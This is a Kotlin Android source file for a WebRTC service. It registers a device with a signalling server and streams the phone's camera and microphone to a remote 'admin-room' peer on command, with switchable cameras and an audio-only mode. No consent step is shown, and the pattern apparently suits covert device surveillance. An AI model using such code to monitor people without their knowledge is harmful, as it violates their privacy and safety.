package com.csk4.app

import android.content.Context
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import org.webrtc.*
import java.net.URI

class WebRTCService(private val ctx: Context, private val deviceId: String) {

    private val TAG = "CSK4_WEBRTC"
    private var peerConnection: PeerConnection? = null
    private var videoSource: VideoSource? = null
    private var audioSource: AudioSource? = null
    private var videoTrack: VideoTrack? = null
    private var audioTrack: AudioTrack? = null
    private var surfaceHelper: SurfaceTextureHelper? = null
    private var cameraCapturer: CameraVideoCapturer? = null
    private var socket: Socket? = null
    private var factory: PeerConnectionFactory? = null
    private var eglBase: EglBase? = null
    private var isFrontCamera = false
    private var isAudioOnly = false

    fun start(cameraFacing: Boolean = false, audioOnly: Boolean = false, onStatus: (String) -> Unit) {
        try {
            isAudioOnly = audioOnly
            isFrontCamera = cameraFacing

            eglBase = EglBase.create()

            PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(ctx)
                    .setEnableInternalTracer(false)
                    .createInitializationOptions()
            )

            val encoderFactory = DefaultVideoEncoderFactory(eglBase!!.eglBaseContext, true, true)
            val decoderFactory = DefaultVideoDecoderFactory(eglBase!!.eglBaseContext)

            factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(encoderFactory)
                .setVideoDecoderFactory(decoderFactory)
                .createPeerConnectionFactory()

            // Audio
            val audioConstraints = MediaConstraints()
            audioSource = factory!!.createAudioSource(audioConstraints)
            audioTrack = factory!!.createAudioTrack("audio0", audioSource)
            audioTrack?.setEnabled(true)

            // Video
            if (!audioOnly) {
                surfaceHelper = SurfaceTextureHelper.create("CaptureThread", eglBase!!.eglBaseContext)
                cameraCapturer = createCameraCapturer(cameraFacing)
                if (cameraCapturer != null) {
                    videoSource = factory!!.createVideoSource(cameraCapturer!!.isScreencast)
                    cameraCapturer!!.initialize(surfaceHelper, ctx, videoSource)
                    cameraCapturer!!.startCapture(1280, 720, 30)
                    videoTrack = factory!!.createVideoTrack("video0", videoSource)
                    videoTrack?.setEnabled(true)
                }
            }

            // Socket.io
            val opts = IO.Options()
            opts.transports = arrayOf("websocket")
            socket = IO.socket(URI.create(Config.SERVER_URL), opts)
            socket?.connect()
            socket?.emit("register-device", deviceId)

            socket?.on("webrtc-offer") { args ->
                try {
                    val data = args[0] as JSONObject
                    val signal = data.getJSONObject("signal")
                    handleOffer(signal)
                    onStatus("offer_received")
                } catch (e: Exception) {
                    Log.e(TAG, "Offer error: ${e.message}")
                }
            }

            socket?.on("webrtc-ice") { args ->
                try {
                    val data = args[0] as JSONObject
                    val c = data.optJSONObject("signal") ?: return@on
                    val ice = IceCandidate(
                        c.optString("sdpMid"),
                        c.optInt("sdpMLineIndex"),
                        c.optString("candidate")
                    )
                    peerConnection?.addIceCandidate(ice)
                } catch (e: Exception) {
                    Log.e(TAG, "ICE error: ${e.message}")
                }
            }

            onStatus("started")
        } catch (e: Exception) {
            Log.e(TAG, "Start fail: ${e.message}")
            onStatus("fail: ${e.message}")
        }
    }

    private fun handleOffer(offer: JSONObject) {
        try {
            val iceServers = listOf(
                PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
            )
            val rtcConfig = PeerConnection.RTCConfiguration(iceServers)
            rtcConfig.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN

            peerConnection = factory?.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
                override fun onIceCandidate(candidate: IceCandidate) {
                    try {
                        val c = JSONObject().apply {
                            put("sdpMid", candidate.sdpMid)
                            put("sdpMLineIndex", candidate.sdpMLineIndex)
                            put("candidate", candidate.sdp)
                        }
                        val data = JSONObject().apply {
                            put("target", "admin-room")
                            put("signal", c)
                        }
                        socket?.emit("webrtc-ice", data)
                    } catch (_: Exception) {}
                }
                override fun onIceCandidatesRemoved(c: Array<out IceCandidate>?) {}
                override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
                override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
                    Log.d(TAG, "ICE: $state")
                }
                override fun onIceConnectionReceivingChange(p0: Boolean) {}
                override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
                override fun onAddStream(stream: MediaStream?) {}
                override fun onRemoveStream(stream: MediaStream?) {}
                override fun onDataChannel(channel: DataChannel?) {}
                override fun onRenegotiationNeeded() {}
                override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
            })

            val streams = listOf("stream0")
            videoTrack?.let { peerConnection?.addTrack(it, streams) }
            audioTrack?.let { peerConnection?.addTrack(it, streams) }

            val sdp = SessionDescription(SessionDescription.Type.OFFER, offer.getString("sdp"))
            peerConnection?.setRemoteDescription(SimpleSdpObserver(), sdp)

            peerConnection?.createAnswer(object : SimpleSdpObserver() {
                override fun onCreateSuccess(desc: SessionDescription) {
                    peerConnection?.setLocalDescription(SimpleSdpObserver(), desc)
                    try {
                        val signal = JSONObject().apply { put("sdp", desc.description) }
                        val data = JSONObject().apply {
                            put("target", "admin-room")
                            put("signal", signal)
                        }
                        socket?.emit("webrtc-answer", data)
                    } catch (_: Exception) {}
                }
            }, MediaConstraints())
        } catch (e: Exception) {
            Log.e(TAG, "handleOffer fail: ${e.message}")
        }
    }

    fun switchCamera() {
        cameraCapturer?.switchCamera(object : CameraVideoCapturer.CameraSwitchHandler {
            override fun onCameraSwitchDone(isFront: Boolean) { isFrontCamera = isFront }
            override fun onCameraSwitchError(err: String?) { Log.e(TAG, "switch: $err") }
        })
    }

    fun stop() {
        try {
            cameraCapturer?.stopCapture()
            cameraCapturer?.dispose()
            videoSource?.dispose()
            audioSource?.dispose()
            videoTrack?.dispose()
            audioTrack?.dispose()
            peerConnection?.close()
            peerConnection?.dispose()
            factory?.dispose()
            surfaceHelper?.dispose()
            socket?.disconnect()
            socket?.off()
            eglBase?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Stop: ${e.message}")
        } finally {
            peerConnection = null; factory = null; socket = null
            cameraCapturer = null; videoSource = null; audioSource = null
            videoTrack = null; audioTrack = null; surfaceHelper = null; eglBase = null
        }
    }

    private fun createCameraCapturer(front: Boolean): CameraVideoCapturer? {
        val enumerator = Camera2Enumerator(ctx)
        for (n in enumerator.deviceNames) {
            if (front && enumerator.isFrontFacing(n)) return enumerator.createCapturer(n, null)
            if (!front && enumerator.isBackFacing(n)) return enumerator.createCapturer(n, null)
        }
        return enumerator.deviceNames.firstOrNull()?.let { enumerator.createCapturer(it, null) }
    }
}